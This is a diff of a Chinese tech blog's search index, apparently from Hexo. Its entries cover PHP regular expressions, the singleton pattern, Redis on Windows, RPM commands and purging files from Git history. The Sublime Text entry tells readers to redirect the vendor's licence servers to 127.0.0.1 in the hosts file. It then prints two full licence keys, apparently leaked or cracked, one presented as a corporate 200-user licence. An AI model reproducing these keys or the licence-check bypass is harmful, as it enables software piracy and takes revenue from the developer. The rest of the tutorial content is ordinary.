+    <content type="text"><![CDATA[正则中的一些概念元字符12345678910111213. 匹配除换行符意外的任意字符\w 匹配字母或数字或下划线\s 匹配任意的空白符\d 匹配数字\b 匹配单词的开始或结束^ 匹配字符串的开始$ 匹配字符串的结束[x] 匹配x字符，如匹配字符串中的 a、b 和 c 字符\W \w的反义，即匹配任意非字母，数字，下划线和汉字的字符\S \s的反义，即匹配任意非空白符的字符\D \d的反义，即匹配任意非数字的字符\B \b的反义，即不是单词开头或结束的位置[^x] 匹配除了 x 意外的任意字符，如 [^abc] 匹配除了 abc 这几个字母之外的任意字符 重复123456* 重复零次或更多次+ 重复 1 次或更多次? 重复零次或 1 次&#123;n&#125; 重复 n 次&#123;n,&#125; 重复 n 次或更多次&#123;n,m&#125; 重复 n 到 m 次 模式修正符123456789i 模式中的字符将同时匹配大小写字母m 字符串视为多行s 将字符串视为单行，换行符作为普通字符x 将模式中的空白忽略e preg_replace() 函数在替换字符串中对逆向引用作正常的替换，将其作为 PHP 代码求值，并用其结果来替换所搜索的字符串。A 强制仅从目标字符串的开头开始匹配D 模式中的 $ 元字符仅匹配目标字符串的结尾U 匹配最近的字符串u 模式字符串被当成 UTF-8 PHP正则函数在 PHP 应用中，正则表达式主要用于： 正则匹配：根据正则表达式匹配相应的内容 正则替换：根据正则表达式匹配内容并替换 正则分割：根据正则表达式分割字符串 PHP 正则表达式匹配 preg_match 与 preg_match_all 函数preg_match()preg_match() 函数用于进行正则表达式匹配，成功返回 1 ，否则返回 0 。 语法： int preg_match( string pattern, string subject [, array matches ] ) 参数说明： pattern 正则表达式 subject 需要匹配检索的对象 matches 可选，存储匹配结果的数组， $matches[0] 将包含与整个模式匹配的文本，$matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推 preg_match_all()preg_match_all() 函数用于进行正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 。 语法： int preg_match_all( string pattern, string subject, array matches [, int flags ] ) 参数说明:pattern: 正则表达式subject: 需要匹配检索的对象matches: 存储匹配结果的数组flags: 可选，指定匹配结果放入 matches 中的顺序，可供选择的标记有： 1. PREG_PATTERN_ORDER：默认，对结果排序使 $matches[0] 为全部模式匹配的数组，$matches[1] 为第一个括号中的子模式所匹配的字符串组成的数组，以此类推 2. PREG_SET_ORDER：对结果排序使 $matches[0] 为第一组匹配项的数组，$matches[1] 为第二组匹配项的数组，以此类推 3. PREG_OFFSET_CAPTURE：如果设定本标记，对每个出现的匹配结果也同时返回其附属的字符串偏移量 部分实例1234567891011121314151617//1，过滤所有html标签的正则表达式：&lt;/?[^&gt;]+&gt;//2，过滤所有html标签的属性的正则表达式：$html = preg_replace("/&lt;([a-zA-Z]+)[^&gt;]*&gt;/","&lt;\\1&gt;",$html);//3，过滤部分html标签的正则表达式的排除式（比如排除&lt;p&gt;，即不过滤&lt;p&gt;）：&lt;/?[^pP/&gt;]+&gt;//4，过滤部分html标签的正则表达式的枚举式（比如需要过滤&lt;a&gt;&lt;p&gt;&lt;b&gt;等）：&lt;/?[aApPbB][^&gt;]*&gt;//5，过滤部分html标签的属性的正则表达式的排除式（比如排除alt属性，即不过滤alt属性）：\s(?!alt)[a-zA-Z]+=[^\s]*//6，过滤部分html标签的属性的正则表达式的枚举式（比如alt属性）：(\s)alt=[^\s]* 正则表达式中排除不需要匹配的字符串或字符(1)排除不需要匹配的某个字符： 例： [^\w] 排除匹配中的一个数字或字符串 (2) 排除匹配中不需要的字符串：例：(?!元宝商城|游戏特权|图说新游|多玩策划|新游视频|娱乐视频|多玩演播室|多玩画报) 加上|用于或选择。上面列出的字符串都不会参与匹配 常用正则 删除空行: \r\n\r\n =&gt; \r\n\ 删除有空格的空行: ^ +$ =&gt;]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[PHP设计模式]]></title>
+    <url>%2F2017%2F12%2F22%2Fphp%2Fphp-design-pattern.html</url>
+    <content type="text"><![CDATA[我们常用的php设计模式有: 单例模式) 单例模式) Interpreter(解释器模式)Factory(工厂模式)Facade(外观模式)Decorator(装饰模式)Builder(建造者模式)Adapter(适配器模式)Template (模板模式)Command(命令模式)Singleton(单例模式)单例模式确保某一个类只有一个实例，而且自行实例化并向整个系统提供这个实例，这个类我们称之为单例类。 单例模式的要点有三个： 是某个类只能有一个实例； 是它必须自行创建这个实例； 是它必须自行向整个系统提供这个实例。 为什么要使用PHP单例模式？ 多数 人都是从单例模式的字面上的意思来理解它的用途, 认为这是对系统资源的节省, 可以避免重复实例化, 是一种”计划生育”. 而PHP每次执行完页面都是会从内存中清理掉所有的资源. 因而PHP中的单例实际每次运行都是需要重新实例化的, 这样就失去了单例重复实例化的意义了. 单单从这个方面来说, PHP的单例的确有点让各位失望. 但是单例仅仅只有这个功能和应用吗? 答案是否定的,我们一起来看看。 php的应用主要在于数据库应用, 所以一个应用中会存在大量的数据库操作, 在使用面向对象的方式开发时(废话), 如果使用单例模式, 则可以避免大量的new 操作消耗的资源。 如果系统中需要有一个类来全局控制某些配置信息, 那么使用单例模式可以很方便的实现. 这个可以参看zend Framework的FrontController部分。 在一次页面请求中, 便于进行调试, 因为所有的代码(例如数据库操作类db)都集中在一个类中, 我们可以在类中设置钩子, 输出日志，从而避免到处var_dump, echo。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?php /*** 设计模式之单例模式* $_instance必须声明为静态的私有变量* 构造函数和析构函数必须声明为私有,防止外部程序new* 类从而失去单例模式的意义* getInstance()方法必须设置为公有的,必须调用此方法* 以返回实例的一个引用* ::操作符只能访问静态变量和静态函数* new对象都会消耗内存* 使用场景:最常用的地方是数据库连接。 * 使用单例模式生成一个对象后，* 该对象可以被其它众多对象所使用。 */class Example&#123;//保存例实例在此属性中private static $_instance;//构造函数声明为private,防止直接创建对象private function __construct()&#123;echo 'I am Construceted';&#125;//单例方法public static function singleton()&#123;if(!isset(self::$_instance))&#123;$c=__CLASS__;self::$_instance=new $c;&#125;return self::$_instance;&#125; //阻止用户复制对象实例public function __clone()&#123;trigger_error('Clone is not allow' ,E_USER_ERROR);&#125;function test()&#123;echo("test");&#125;&#125;// 这个写法会出错，因为构造方法被声明为private$test = new Example;// 下面将得到Example类的单例对象$test = Example::singleton();$test-&gt;test();// 复制对象将导致一个E_USER_ERROR.$test_clone = clone $test;?&gt; Observer(观察者模式)Strategy(策略模式)Visitor (访问者模式)Memento (备忘录模式)Prototype (原型模式)Mediator (中介者模式)FlyWeight (享元模式)Chain Of Responsibility (职责链模式)Bridge (桥接模式)Proxy (代理模式)State (状态模式)Composite (组合模式)Interator (迭代器模式) 解释 参考文章 图说设计模式 php设计模式 (总结) PHP单例模式（转载） PHP设计模式笔记：使用PHP实现单例模式]]></content>
       <categories>
         <category>php</category>
       </categories>
@@ -706,9 +788,9 @@
       </categories>
   </entry>
   <entry>
-    <title><![CDATA[PHP正则使用]]></title>
-    <url>%2F2017%2F12%2F22%2Fphp%2Fphp-preg.html</url>
-    <content type="text"><![CDATA[正则中的一些概念元字符12345678910111213. 匹配除换行符意外的任意字符\w 匹配字母或数字或下划线\s 匹配任意的空白符\d 匹配数字\b 匹配单词的开始或结束^ 匹配字符串的开始$ 匹配字符串的结束[x] 匹配x字符，如匹配字符串中的 a、b 和 c 字符\W \w的反义，即匹配任意非字母，数字，下划线和汉字的字符\S \s的反义，即匹配任意非空白符的字符\D \d的反义，即匹配任意非数字的字符\B \b的反义，即不是单词开头或结束的位置[^x] 匹配除了 x 意外的任意字符，如 [^abc] 匹配除了 abc 这几个字母之外的任意字符 重复123456* 重复零次或更多次+ 重复 1 次或更多次? 重复零次或 1 次&#123;n&#125; 重复 n 次&#123;n,&#125; 重复 n 次或更多次&#123;n,m&#125; 重复 n 到 m 次 模式修正符123456789i 模式中的字符将同时匹配大小写字母m 字符串视为多行s 将字符串视为单行，换行符作为普通字符x 将模式中的空白忽略e preg_replace() 函数在替换字符串中对逆向引用作正常的替换，将其作为 PHP 代码求值，并用其结果来替换所搜索的字符串。A 强制仅从目标字符串的开头开始匹配D 模式中的 $ 元字符仅匹配目标字符串的结尾U 匹配最近的字符串u 模式字符串被当成 UTF-8 PHP正则函数在 PHP 应用中，正则表达式主要用于： 正则匹配：根据正则表达式匹配相应的内容 正则替换：根据正则表达式匹配内容并替换 正则分割：根据正则表达式分割字符串 PHP 正则表达式匹配 preg_match 与 preg_match_all 函数preg_match()preg_match() 函数用于进行正则表达式匹配，成功返回 1 ，否则返回 0 。 语法： int preg_match( string pattern, string subject [, array matches ] ) 参数说明： pattern 正则表达式 subject 需要匹配检索的对象 matches 可选，存储匹配结果的数组， $matches[0] 将包含与整个模式匹配的文本，$matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推 preg_match_all()preg_match_all() 函数用于进行正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 。 语法： int preg_match_all( string pattern, string subject, array matches [, int flags ] ) 参数说明:pattern: 正则表达式subject: 需要匹配检索的对象matches: 存储匹配结果的数组flags: 可选，指定匹配结果放入 matches 中的顺序，可供选择的标记有： 1. PREG_PATTERN_ORDER：默认，对结果排序使 $matches[0] 为全部模式匹配的数组，$matches[1] 为第一个括号中的子模式所匹配的字符串组成的数组，以此类推 2. PREG_SET_ORDER：对结果排序使 $matches[0] 为第一组匹配项的数组，$matches[1] 为第二组匹配项的数组，以此类推 3. PREG_OFFSET_CAPTURE：如果设定本标记，对每个出现的匹配结果也同时返回其附属的字符串偏移量 部分实例1234567891011121314151617//1，过滤所有html标签的正则表达式：&lt;/?[^&gt;]+&gt;//2，过滤所有html标签的属性的正则表达式：$html = preg_replace("/&lt;([a-zA-Z]+)[^&gt;]*&gt;/","&lt;\\1&gt;",$html);//3，过滤部分html标签的正则表达式的排除式（比如排除&lt;p&gt;，即不过滤&lt;p&gt;）：&lt;/?[^pP/&gt;]+&gt;//4，过滤部分html标签的正则表达式的枚举式（比如需要过滤&lt;a&gt;&lt;p&gt;&lt;b&gt;等）：&lt;/?[aApPbB][^&gt;]*&gt;//5，过滤部分html标签的属性的正则表达式的排除式（比如排除alt属性，即不过滤alt属性）：\s(?!alt)[a-zA-Z]+=[^\s]*//6，过滤部分html标签的属性的正则表达式的枚举式（比如alt属性）：(\s)alt=[^\s]* 正则表达式中排除不需要匹配的字符串或字符(1)排除不需要匹配的某个字符： 例： [^\w] 排除匹配中的一个数字或字符串 (2) 排除匹配中不需要的字符串：例：(?!元宝商城|游戏特权|图说新游|多玩策划|新游视频|娱乐视频|多玩演播室|多玩画报) 加上|用于或选择。上面列出的字符串都不会参与匹配 常用正则 删除空行: \r\n\r\n =&gt; \r\n\ 删除有空格的空行: ^ +$ =&gt;]]></content>
+    <title><![CDATA[PHP使用redis]]></title>
+    <url>%2F2017%2F12%2F22%2Fphp%2Fphp-redis-usage.html</url>
+    <content type="text"><![CDATA[Redis简介: 是一个key-value存储系统,和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)和zset(有序集 合)。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步. window下安装使用redis需要文件: PHP官方Redis扩展下载 win下Redis程序(32位,在目录/bin中) Win下Redis程序(64位) 解压下redis,有如下文件: redis-server.exe：服务程序 redis-check-dump.exe：本地数据库检查 redis-check-aof.exe：更新日志检查 redis-benchmark.exe：性能测试，用以模拟同时由N个客户端发送M个 SETs/GETs 查询 (类似于 Apache 的ab 工具). windows下 使用redis安装好redis后可以在cmd中运行{dir}\redis-server.exe运行redis服务.运行后redis服务端后,可以在cmd通过redis-cli.exe -h 127.0.0.1 -p 6379来运行客户端 简单测试: 1234redis 127.0.0.1:6379&gt; set mykey somevalueOKredis 127.0.0.1:6379&gt; get mykey"somevalue" 如何添加值到list: 123456789101112131415redis 127.0.0.1:6379&gt; lpush mylist val1(integer) 1redis 127.0.0.1:6379&gt; lpush mylist val2(integer) 2redis 127.0.0.1:6379&gt; lpush mylist val3(integer) 3redis 127.0.0.1:6379&gt; lpush mylist val4(integer) 4redis 127.0.0.1:6379&gt; lrange mylist 0 -1 1&gt; val1 2&gt; val2 3&gt; val3 4&gt; val4redis 127.0.0.1:6379&gt; rpop mylist "val1" redis-benchmark.exe：性能测试，用以模拟同时由N个客户端发送M个 SETs/GETs 查询 (类似于 Apache 的 ab 工具). 1D:\wnmp\redis&gt;redis-benchmark -n 100000 –c 50 linux下安装使用redis 参考 http://my.oschina.net/lujianing/blog/204103]]></content>
       <categories>
         <category>php</category>
       </categories>
@@ -751,19 +833,19 @@
     <content type="text"><![CDATA[Linux RPM安装与卸载命令 RPM（Red Hat Package Manager）命令：rpm1、查询、检查软件包rpm {-q|–query} [select-options] [query-options]rpm {-V|–verify} [select-options] [verify-options]2、安装、升级、删除软件包rpm {-i|–install} [install-options] PACKAGE_FILE …rpm {-U|–upgrade} [install-options] PACKAGE_FILE …rpm {-F|–freshen} [install-options] PACKAGE_FILE …rpm {-e|–erase} [–allmatches] [–nodeps] [–noscripts] [–notriggers] [–repackage] [–test] PACKAGE_NAME …3、其他rpm {–initdb|–rebuilddb}rpm {–addsign|–resign} PACKAGE_FILE …rpm {–querytags|–showrc}rpm {–setperms|–setugids} PACKAGE_NAME …RPM（Red Hat Package Manager）命令：rpmselect-options [PACKAGE_NAME] [-a,–all] [-f,–file FILE] [-g,–group GROUP] {-p,–package PACKAGE_FILE] [–fileid MD5] [–hdrid SHA1] [–pkgid MD5] [–tid TID] [–querybynumber HDRNUM] [–triggeredby PACKAGE_NAME] [–whatprovides CAPABILITY] [–whatrequires CAPABILITY]query-options [–changelog] [-c,–configfiles] [-d,–docfiles] [–dump] [–filesbypkg] [-i,–info] [–last] [-l,–list] [–provides] [–qf,–queryformat QUERYFMT] [-R,–requires] [–scripts] [-s,–state] [–triggers,–triggerscripts]verify-options [–nodeps] [–nofiles] [–noscripts] [–nodigest] [–nosignature] [–nolinkto] [–nomd5] [–nosize] [–nouser] [–nogroup] [–nomtime] [–nomode] [–nordev]RPM（Red Hat Package Manager）命令：rpminstall-options [–aid] [–allfiles] [–badreloc] [–excludepath OLDPATH] [–excludedocs] [–force] [-h,–hash] [–ignoresize] [–ignorearch] [–ignoreos] [–includedocs] [–justdb] [–nodeps] [–nodigest] [–nosignature] [–nosuggest] [–noorder] [–noscripts] [–notriggers] [–oldpackage] [–percent] [–prefix NEWPATH] [–relocate OLDPATH=NEWPATH] [–repackage] [–replacefiles] [–replacepkgs] [–test] 【示例】rpm -v 显示rpm程序的详细信息rpm –version 显示rpm的版本号rpm -qa 显示系统中安装的所有软件包rpm -q gcc 查询指定软件包是否已安装rpm -qi gcc 显示指定软件包的详细信息RPM（Red Hat Package Manager）命令：rpmrpm -ql gcc 显示指定软件包所包含的文件列表rpm -qf /usr/lib/bash 查看指定文件所属的软件包rpm -qp /tmp/webmin.rpm 查询RPM包文件中的文件信息rpm -i webmin-1.290-1.noarch.rpm 安装指定的RPM包rpm -ivh webmin-1.290-1.noarch.rpm 安装并显示详信息rpm -ivh –test webmin-1.290-1.noarch.rpm 对安装进行测试，并不是安装rpm -ivh –replacepkgs webmin-1.290-1.noarch.rpm软件包重复安装将会失败，若仍需要安装必须加–replacepkgsrpm -ivh –replacefiles webmin-1.290-1.noarch.rpm软件包的某个文件已在安装其他软件包时安装过，则安装将会失败，若仍需要安装必须加–replacefilesrpm -ivh –nodeps webmin-1.290-1.noarch.rpm软件包所依赖的软件包未安装，则安装将会失败，若仍需要安装必须加—nodepsrpm -ivh –force webmin-1.290-1.noarch.rpm 强制安装指定软件包 （忽略软件包依赖性和文件冲突，不建议）RPM（Red Hat Package Manager）命令：rpmrpm –U webmin-1.29 升级指定的软件包rpm –Uvh webmin-1.29 升级指定的软件包（显示详细信息） rpm -e webmin-1.29 删除指定的软件包rpm -V webmin 验证软件包webminrpm -Vf /bin/vi 验证包含指定文件的软件包是否正确rpm -Va 验证所有已经安装的软件包rpm -Vp webmin.rpm 利用RPM文件验证软件包注：如校验正确将没有任何输出（.表示验证通过）5 MD5校验S 文件尺寸L 符号链接T 文件修改日期D 设备U 用户G 用户组M 模式（包括权限和文件类型）]]></content>
   </entry>
   <entry>
-    <title><![CDATA[Git如何永久删除文件(包括历史记录)]]></title>
-    <url>%2F2017%2F12%2F22%2Ftools%2Fgit-remove-history-files.html</url>
-    <content type="text"><![CDATA[步骤一: 从你的资料库中清除文件123git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch *.gz' --prune-empty --tag-name-filter cat -- --allgit filter-branch --force --index-filter 'git rm --cached --ignore-unmatch *.tgz' --prune-empty --tag-name-filter cat -- --allgit filter-branch --force --index-filter 'git rm --cached --ignore-unmatch *.zip' --prune-empty --tag-name-filter cat -- --all ##步骤二: 推送我们修改后的repo 以强制覆盖的方式推送你的repo, 命令如下: 1git push origin master --force 步骤三: 清理和回收空间 虽然上面我们已经删除了文件, 但是我们的repo里面仍然保留了这些objects, 等待垃圾回收(GC), 所以我们要用命令彻底清除它, 并收回空间. 命令如下: 1234rm -rf .git/refs/original/git reflog expire --expire=now --allgit gc --prune=nowgit gc --aggressive --prune=now 设置完成之后, 你可以使用命令du -s .git查看仓库地址空间大小是否有明显减少了. 参考: https://help.github.com/articles/remove-sensitive-data http://www.cnblogs.com/shines77/p/3460274.html]]></content>
-      <categories>
-        <category>coding</category>
-      </categories>
-  </entry>
-  <entry>
     <title><![CDATA[Sublime Text使用]]></title>
     <url>%2F2017%2F12%2F22%2Ftools%2Fsublime-text-usage.html</url>
     <content type="text"><![CDATA[一· 激活码v3176添加hosts:12127.0.0.1 www.sublimetext.com127.0.0.1 license.sublimehq.com 12345678910111213----- BEGIN LICENSE -----sgbteamSingle User LicenseEA7E-11532598891CBB9 F1513E4F 1A3405C1 A865D53F115F202E 7B91AB2D 0D2A40ED 352B269B76E84F0B CD69BFC7 59F2DFEF E267328F215652A3 E88F9D8F 4C38E3BA 5B2DAAE4969624E7 DC9CD4D5 717FB40C 1B9738CF20B3C4F1 E917B5B3 87C38D9C ACCE7DD85F7EF854 86B9743C FADC04AA FB0DA5C0F913BE58 42FEA319 F954EFDD AE881E0B------ END LICENSE ------ v3143sublime text 3 v3143 激活码： 12345678910111213—– BEGIN LICENSE —–TwitterInc200 User LicenseEA7E-8900071D77F72E 390CDD93 4DCBA022 FAF6079061AA12C0 A37081C5 D0316412 4584D13694D7F7D4 95BC8C1C 527DA828 560BB037D1EDDD8C AE7B379F 50C9D69D B35179EF2FE898C4 8E4277A8 555CE714 E1FB0E43D5D52613 C3D12E98 BC49967F 7652EED29D2D2E61 67610860 6D338B72 5CF95C69E36B85CC 84991F19 7575D828 470A92AB—— END LICENSE —— 二· 常用插件 输入法 IMESupport: windows下解决中文输入光标的问题 sublime-text-imfix: linux下解决中文输入光标的问题 SublimeFcitx: linux下解决中文输入光标的问题]]></content>
       <categories>
         <category>tools</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[Git如何永久删除文件(包括历史记录)]]></title>
+    <url>%2F2017%2F12%2F22%2Ftools%2Fgit-remove-history-files.html</url>
+    <content type="text"><![CDATA[步骤一: 从你的资料库中清除文件123git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch *.gz' --prune-empty --tag-name-filter cat -- --allgit filter-branch --force --index-filter 'git rm --cached --ignore-unmatch *.tgz' --prune-empty --tag-name-filter cat -- --allgit filter-branch --force --index-filter 'git rm --cached --ignore-unmatch *.zip' --prune-empty --tag-name-filter cat -- --all ##步骤二: 推送我们修改后的repo 以强制覆盖的方式推送你的repo, 命令如下: 1git push origin master --force 步骤三: 清理和回收空间 虽然上面我们已经删除了文件, 但是我们的repo里面仍然保留了这些objects, 等待垃圾回收(GC), 所以我们要用命令彻底清除它, 并收回空间. 命令如下: 1234rm -rf .git/refs/original/git reflog expire --expire=now --allgit gc --prune=nowgit gc --aggressive --prune=now 设置完成之后, 你可以使用命令du -s .git查看仓库地址空间大小是否有明显减少了. 参考: https://help.github.com/articles/remove-sensitive-data http://www.cnblogs.com/shines77/p/3460274.html]]></content>
+      <categories>
+        <category>coding</category>
       </categories>
   </entry>
   <entry>
@@ -1503,8 +1585,8 @@
         <category>linux</category>
       </categories>
       <tags>
-        <tag>lnmp</tag>
         <tag>linux</tag>
+        <tag>lnmp</tag>
         <tag>Nginx</tag>
         <tag>编译nginx</tag>
       </tags>
@@ -1519,8 +1601,8 @@
       <tags>
         <tag>Sublime Text</tag>
         <tag>sublime插件</tag>
-        <tag>Packges</tag>
         <tag>Package Control</tag>
+        <tag>Packges</tag>
       </tags>
   </entry>
   <entry>
@@ -1546,8 +1628,8 @@
       <tags>
         <tag>Sublime Text</tag>
         <tag>sublime插件</tag>
-        <tag>Emmet</tag>
         <tag>Packges</tag>
+        <tag>Emmet</tag>
         <tag>PyV8</tag>
       </tags>
   </entry>
